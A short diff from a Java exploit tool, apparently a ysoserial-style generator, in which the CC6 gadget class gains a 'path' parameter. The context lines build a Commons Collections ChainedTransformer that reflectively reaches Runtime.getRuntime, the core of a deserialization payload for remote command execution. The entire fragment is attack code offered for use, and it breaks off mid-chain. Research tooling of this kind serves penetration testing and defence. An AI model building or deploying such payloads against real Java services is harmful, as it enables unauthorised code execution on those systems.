@@ -14,7 +14,7 @@ import java.util.HashSet;
 import java.util.Map;
 
 public class CC6 implements Gadget {
-    public Object getObject(String common) throws Exception {
+    public Object getObject(String common,String path) throws Exception {
         ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
